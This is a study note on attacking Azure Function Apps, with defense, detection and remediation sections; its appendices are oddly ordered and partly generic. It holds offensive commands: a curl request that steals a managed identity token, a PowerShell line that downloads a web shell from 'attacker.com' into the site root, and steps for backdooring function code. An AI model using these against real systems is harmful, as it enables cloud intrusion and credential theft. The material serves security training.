---
tags: [cloud, azure, function-apps, serverless, secrets, privesc]
difficulty: intermediate
module: "37 - Cloud Infrastructure"
topic: "37.20 Azure Function Apps"
---

# Azure Function Apps — Exposed Secrets and Abuse

Azure Functions represents Microsoft's serverless compute service, allowing developers to run event-triggered code without managing infrastructure. Due to the seamless integration of Azure Functions with the rest of the Azure ecosystem, these apps often possess high-level privileges and handle sensitive credentials. Exploiting Azure Function Apps—whether via exposed secrets, Server-Side Request Forgery (SSRF), or compromised source code—is a highly effective way for attackers to pivot into the broader Azure environment.

## 1. Architectural Deep Dive: Kudu, App Settings, and Identity

To exploit an Azure Function App, one must understand its underlying architecture, which shares much of its DNA with Azure App Service.

### The Kudu SCM Environment

Every Azure Function App has an accompanying "Advanced Tools" environment known as Kudu. Kudu handles deployment, background processes, and troubleshooting.
*   **Main App URL**: `https://myfunction.azurewebsites.net`
*   **Kudu SCM URL**: `https://myfunction.scm.azurewebsites.net`

Kudu provides a web-based shell (CMD or PowerShell), an environment variable explorer, and a file browser. If an attacker compromises the deployment credentials, or bypasses authentication, they gain full administrative control over the execution environment via Kudu.

### App Settings and Environment Variables

In serverless architectures, secrets (API keys, database connection strings) are frequently passed as environment variables. In Azure, these are managed as "App Settings." When a function executes, these settings are loaded into memory.

### Managed Identities (MSI)

Instead of hardcoding credentials, best practice dictates using an Azure Managed Identity. A Managed Identity is an Azure AD Service Principal automatically managed by Azure and attached to the Function App. The function queries a local endpoint to obtain an OAuth token for this identity, which is then used to authenticate to other Azure services (like Key Vault or SQL).

### ASCII Architecture Diagram

```text
+-------------------------------------------------------------------------+
|                          Azure Function App Environment                 |
|                                                                         |
|  +-----------------------+              +----------------------------+  |
|  |     Kudu SCM          |              |    Function Runtime        |  |
|  | (.scm.azurewebsites)  |              |    (Node.js, C#, Python)   |  |
|  |                       |              |                            |  |
|  | - Web Shell           |              |  [Execution of Code]       |  |
|  | - File Explorer       |              |           |                |  |
|  +-----------+-----------+              +-----------+----------------+  |
|              |                                      |                   |
|              +-------------------+------------------+                   |
|                                  |                                      |
|                                  v                                      |
|  +-------------------------------------------------------------------+  |
|  |                    Environment Variables / App Settings           |  |
|  |  - AzureWebJobsStorage = DefaultEndpointsProtocol=https;...       |  |
|  |  - DATABASE_PASSWORD = SuperSecretPassword123                     |  |
|  |  - IDENTITY_ENDPOINT = http://169.254.129.2:8081/msi/token        |  |
|  +-------------------------------------------------------------------+  |
+-------------------------------------------------------------------------+
                                   |
                                   |  Uses Managed Identity Token
                                   v
+-------------------------------------------------------------------------+
|                           Azure Cloud Services                          |
|             (Azure Key Vault, Cosmos DB, Azure Resource Manager)        |
+-------------------------------------------------------------------------+
```

## 2. Exploitation Vectors

### 2.1 Extracting Secrets via SSRF or RCE

If an attacker finds a Server-Side Request Forgery (SSRF) vulnerability or achieves Remote Code Execution (RCE) within the function's code, their first objective is to dump the environment variables.

**Via RCE (e.g., Python):**
```python
import os
print(os.environ)
```

**Via SSRF (Targeting the Managed Identity Endpoint):**
Unlike the Azure VM IMDS endpoint (`169.254.169.254`), App Services and Functions use a different endpoint defined by environment variables: `IDENTITY_ENDPOINT` and `IDENTITY_HEADER`.

If the attacker has a blind SSRF, they must first find a way to leak these two variables. If they can execute code or read files (like `/proc/self/environ` in Linux runtimes), they can construct the request:

```bash
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

The response provides a Bearer token. The attacker uses this token to act as the Function App's Service Principal, enumerating its Azure RBAC permissions and pivoting to other resources.

### 2.2 The `AzureWebJobsStorage` Vulnerability

One of the most critical and frequently abused App Settings is `AzureWebJobsStorage`.
Every Function App requires a standard Azure Storage account to manage state, function triggers, and logging. The connection string for this storage account is stored in the `AzureWebJobsStorage` environment variable.

**The Attack Path:**
1.  Attacker extracts `AzureWebJobsStorage` via Local File Inclusion (LFI), path traversal, RCE, or a leaked backup.
2.  The connection string contains the Storage Account Name and the **Account Key**.
    `DefaultEndpointsProtocol=https;AccountName=vulnerablefuncsa;AccountKey=abc123...;EndpointSuffix=core.windows.net`
3.  The attacker connects to this Storage Account using Azure Storage Explorer or CLI tools.
4.  **Source Code Compromise**: Function code is frequently stored as a `.zip` file in the `azure-webjobs-secrets` or `scm-releases` containers within this storage account. The attacker downloads the zip, decompresses it, and reviews the source code for hardcoded API keys or business logic flaws.
5.  **Persistence/RCE**: The attacker can upload a modified, malicious `.zip` file containing a backdoored function and force the Function App to sync and execute the new payload, cementing their access.

### 2.3 Kudu Credentials Leakage

Developers sometimes export the "Publish Profile" of the Function App and accidentally commit it to a public GitHub repository. This XML file contains the username and password for the Kudu deployment environment.

If an attacker obtains these credentials:
1.  They navigate to `https://[app-name].scm.azurewebsites.net`.
2.  They log in with the deployment credentials.
3.  They use the Kudu Debug Console to drop into a live shell on the server.
4.  From the shell, they type `set` (Windows) or `env` (Linux) to dump all secrets, or browse the `D:\home\site\wwwroot` directory to view the source code.

## 3. Defense and Remediation

Securing Azure Functions requires removing hardcoded secrets from the environment and relying strictly on identity-based access.

1.  **Use Azure Key Vault References**: Never store raw secrets (passwords, connection strings) directly in the Function's App Settings. Instead, store the secret in Azure Key Vault and place a Key Vault Reference in the App Setting:
    `@Microsoft.KeyVault(SecretUri=https://myvault.vault.azure.net/secrets/mysecret/)`
    The Function App uses its Managed Identity to fetch the secret transparently at runtime.
2.  **Identity-Based Connections**: Modern Azure Functions support identity-based connections for triggers. Instead of using `AzureWebJobsStorage` with an Account Key, use `AzureWebJobsStorage__accountName` and grant the Managed Identity the "Storage Blob Data Owner" role on the storage account. This eliminates the highly privileged Account Key from the environment entirely.
3.  **Network Restrictions**: Use Access Restrictions to limit inbound access to the Function App (e.g., only allow traffic from an API Management gateway or a specific VNet).
4.  **Disable SCM/Kudu Public Access**: Restrict access to the `.scm.azurewebsites.net` endpoint to trusted IP ranges or disable basic authentication entirely to enforce Azure AD login for deployment.
5.  **Least Privilege Managed Identities**: Ensure the Function App's Managed Identity has only the minimum RBAC permissions required. It should not be an Owner or Contributor at the Subscription level.

## 4. Forensics and Detection

*   **App Service Logs**: Monitor the `AppServiceConsoleLogs` and `AppServiceHTTPLogs` for anomalous requests, particularly those hitting unusual paths or generating a high volume of 500 errors (which often indicate exploitation attempts).
*   **Key Vault Access Logs**: If Key Vault references are used, monitor `AzureDiagnostics` for the Key Vault. Look for the Function App's Managed Identity retrieving secrets at abnormal frequencies or times.
*   **Storage Account Activity**: Monitor the storage account linked to the Function App. Look for unexpected IP addresses downloading blob data from the `azure-webjobs-secrets` container, which indicates someone is downloading the source code.
*   **Deployment Logs**: Track Kudu deployment activities in Activity Logs. Look for `Action: Microsoft.Web/sites/publish/Action` from unrecognized IP addresses, indicating an attacker is uploading backdoored code.

## Chaining Opportunities

*   **[[21 - Azure SSRF via Metadata]]**: Using an SSRF in the web app logic to hit the Managed Identity endpoint.
*   **[[18 - Azure AD — Misconfiguration, Privilege Escalation]]**: Once the Managed Identity token is extracted, the attacker uses it to interact with the Graph API or Azure Resource Manager to escalate privileges across the tenant.
*   **[[19 - Azure Blob Storage — Public Access]]**: Sometimes the `AzureWebJobsStorage` is left exposed publicly, allowing direct extraction of the function code without needing RCE.

## Related Notes

*   [[16 - GCP Cloud Functions — Privilege Escalation]] - Similar concepts regarding serverless identity abuse in GCP.
*   [[10 - Serverless Security Risks]] - General overview of serverless attack surfaces.

## Appendix D: Comprehensive Cloud Penetration Testing Methodology
When assessing cloud environments for default service account abuse and privilege escalation, standard network penetration testing methodologies fall short. The focus must shift to identity, metadata, and control plane interactions.

### Step 1: Reconnaissance & OSINT
*   Identify cloud provider footprint via ASN mapping and DNS enumeration.
*   Enumerate public storage buckets and exposed serverless functions.
*   Scrape GitHub and GitLab for accidentally committed service account keys or infrastructure-as-code (IaC) templates.

### Step 2: Initial Access & Foothold
*   Exploit traditional web vulnerabilities (SSRF, RCE, LFI) on exposed compute instances.
*   Phish internal developers for overly permissive tokens or CLI credentials.
*   Utilize compromised CI/CD pipelines as an entry point into the cloud fabric.

### Step 3: Local Enumeration & Metadata Extraction
*   Query the link-local metadata servers (`169.254.169.254`).
*   Extract instance identity tokens, project metadata, and user-data/startup scripts.
*   Analyze the local environment variables and hidden files (`.aws/credentials`, `gcloud/application_default_credentials.json`).

### Step 4: Lateral Movement & Privilege Escalation
*   Leverage stolen tokens to authenticate to the cloud provider's API.
*   Enumerate attached IAM policies, roles, and scopes.
*   Exploit misconfigurations (e.g., `iam.serviceAccounts.actAs` or missing scope limits) to jump to higher-privileged accounts or resources.

## Appendix E: Incident Response and Forensics Playbook
When a breach is suspected, responders must act quickly to contain the blast radius.

### Containment
1.  **Revoke Tokens**: Immediately revoke the stolen access tokens.
2.  **Isolate the Instance**: Detach the compromised VM from the VPC network or apply a strict deny-all firewall rule, preserving the disk state for forensic imaging.
3.  **Rotate Keys**: Rotate any static access keys or secrets that were accessible from the compromised instance's environment.

### Investigation
1.  **Audit Logs**: Query Cloud Audit Logs for anomalous API calls originating from the compromised service account's token. Look for actions outside its normal baseline.
2.  **Network Flow**: Analyze VPC Flow Logs for unexpected outbound connections, particularly to known threat actor infrastructure or large data transfers indicating exfiltration.
3.  **Disk Forensics**: Image the instance's boot disk and analyze for dropped malware, modified startup scripts, or signs of lateral movement tooling.

## Appendix A: Advanced Kudu Exploitation Techniques

### Deploying Web Shells via Kudu
If an attacker gains access to the Kudu SCM portal, they can easily upload a persistent web shell. Kudu supports various runtimes, so a generic ASP.NET or PHP web shell can be dropped into the `D:\home\site\wwwroot` directory.

```powershell
# Example PowerShell command executed via Kudu console to download a web shell
Invoke-WebRequest -Uri "http://attacker.com/shell.aspx" -OutFile "D:\home\site\wwwroot\shell.aspx"
```
Once uploaded, the shell is accessible via the main Function App URL (`https://myfunction.azurewebsites.net/shell.aspx`), providing reliable command execution without needing to constantly re-authenticate to the Kudu portal.

### Manipulating the VFS (Virtual File System)
Kudu exposes a REST API for file manipulation known as the VFS API. Attackers can use this to remotely edit configuration files, extract secrets, or upload payloads without interacting with the GUI.
```http
GET /api/vfs/site/wwwroot/host.json HTTP/1.1
Host: myfunction.scm.azurewebsites.net
Authorization: Basic [Base64 Credentials]
```

## Appendix B: Network Evasion and Persistence

### Bypassing VNet Restrictions
Often, organizations place their databases and internal APIs inside an Azure Virtual Network (VNet) and configure their Function App with VNet Integration so it can reach them. If an attacker compromises the Function App, they bypass the perimeter firewall. The Function App acts as a pivot point, routing the attacker's traffic directly into the secured VNet.

### Persistent Backdoors in Functions
Attackers can modify the `function.json` file to alter the function's bindings. For example, they could add a new HTTP trigger that executes arbitrary system commands or evaluates base64-encoded strings, turning the legitimate function into a stealthy, serverless Command and Control (C2) endpoint.

## Appendix C: Remediation via Terraform and Bicep
To enforce secure deployments, organizations should use Infrastructure as Code (IaC) to configure Function Apps with Managed Identities and Key Vault references.
```bicep
resource functionApp 'Microsoft.Web/sites@2021-02-01' = {
  name: 'secure-func-app'
  location: location
  identity: {
    type: 'SystemAssigned' // Enables Managed Identity
  }
  properties: {
    siteConfig: {
      appSettings: [
        {
          name: 'MySecretDbConnection'
          value: '@Microsoft.KeyVault(SecretUri=${keyVault.properties.vaultUri}secrets/DbSecret/)'
        }
      ]
    }
  }
}
```
